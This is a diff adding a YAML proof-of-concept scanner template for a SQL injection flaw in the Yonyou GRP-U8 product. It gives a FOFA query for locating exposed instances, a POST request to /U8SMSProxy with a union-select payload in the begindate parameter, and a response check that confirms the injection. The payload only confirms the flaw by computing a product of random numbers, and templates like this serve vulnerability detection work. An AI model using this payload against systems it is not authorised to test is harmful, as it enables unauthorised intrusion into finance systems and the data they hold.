@@ -1,0 +1,30 @@
+id: poc-yaml-yongyou-grp-u8-begindate-sqli
+info:
+  name: 用友GRP-U8 begindate SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+variables:
+  t1: random_int(100,10000)
+  t2: random_int(100,10000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /U8SMSProxy?class=XXNote&id=qryyfs
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: begindate='union select {{.t1}}*{{.t2}}--&enddate=2020-10-27&search=
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"total\":") &&
+
+    contains(body,t3) &&
+
+    !contains(body,"<") &&
+
+    contains(content_type,"application/x-json")
+
+    '
+transport: http
